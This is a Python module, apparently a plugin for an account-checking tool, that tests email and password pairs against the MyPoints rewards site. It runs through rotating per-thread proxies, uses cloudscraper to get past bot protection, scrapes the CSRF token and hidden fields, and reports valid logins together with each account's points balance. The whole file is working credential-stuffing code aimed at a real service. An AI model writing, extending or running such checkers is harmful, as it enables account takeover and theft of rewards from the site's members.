"""
Checker for MyPoints (www.mypoints.com)
Uses /secure/login endpoint and member-status verification.
"""
import re
import threading
import time
from typing import Tuple
from urllib.parse import urljoin

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

BASE_URL = "https://www.mypoints.com"
LOGIN_PAGE = BASE_URL + "/login"
API_BASE = "https://api.mypoints.com"
LOGIN_URL = API_BASE + "/secure/login"
STATUS_URL = API_BASE + "/?cmd=mp-gn-member-status"
TIMEOUT = 30

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    if HAS_CLOUDSCRAPER:
        session = cloudscraper.create_scraper()
    else:
        import requests
        session = requests.Session()

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/javascript, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": BASE_URL,
        "Referer": LOGIN_PAGE,
    })

    try:
        # Step 1: GET login page to extract hidden fields and CSRF token
        resp = session.get(LOGIN_PAGE, timeout=TIMEOUT)
        if resp.status_code != 200:
            return False, f"Failed to load login page (HTTP {resp.status_code})"

        html = resp.text

        # Extract hidden form fields
        payload = {}
        hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"'
        for name, value in re.findall(hidden_pattern, html, re.I):
            payload[name] = value

        # CSRF token from meta
        token_match = re.search(r'<meta[^>]*name="csrf-token"[^>]*content="([^"]+)"', html, re.I)
        if token_match:
            payload["_token"] = token_match.group(1)

        # Determine field names for email and password
        email_field = None
        password_field = None
        input_pattern = r'<input[^>]*name="([^"]+)"[^>]*type="([^"]+)"'
        for name, typ in re.findall(input_pattern, html, re.I):
            if typ in ["email", "text"] and ("email" in name.lower() or "user" in name.lower()):
                email_field = name
            elif typ == "password" and "password" in name.lower():
                password_field = name

        if not email_field:
            email_field = "email"
        if not password_field:
            password_field = "password"

        payload[email_field] = email
        payload[password_field] = password

        if "_ajax" not in payload:
            payload["_ajax"] = "1"

        # Step 2: POST to /secure/login
        login_resp = session.post(LOGIN_URL, data=payload, allow_redirects=False, timeout=TIMEOUT)

        # Step 3: Determine success
        if login_resp.status_code == 302:
            location = login_resp.headers.get("Location", "").lower()
            if "login" not in location:
                return True, "Login successful (redirect)"
            else:
                return False, "Login failed (redirected to login)"

        if login_resp.status_code == 200:
            try:
                data = login_resp.json()
            except:
                if "invalid" in login_resp.text.lower():
                    return False, "Invalid credentials"
                return False, f"Unexpected response: {login_resp.text[:100]}"

            if "error" in data:
                return False, f"Login failed: {data['error']}"
            if "message" in data and "invalid" in data["message"].lower():
                return False, f"Login failed: {data['message']}"

            if data.get("success") or data.get("status") == "success":
                return True, "Login successful"

            # If still uncertain, verify via member-status API
            time.sleep(1)  # allow session to propagate
            status_resp = session.get(STATUS_URL, timeout=TIMEOUT)
            if status_resp.status_code == 200:
                try:
                    status_data = status_resp.json()
                    if status_data.get("member", {}).get("loggedIn"):
                        points = status_data["member"].get("points", "N/A")
                        return True, f"Login successful. Points: {points}"
                except:
                    pass

            return False, "Login failed – unknown response"

        return False, f"Login failed (HTTP {login_resp.status_code})"

    except Exception as e:
        return False, f"Request error: {str(e)}"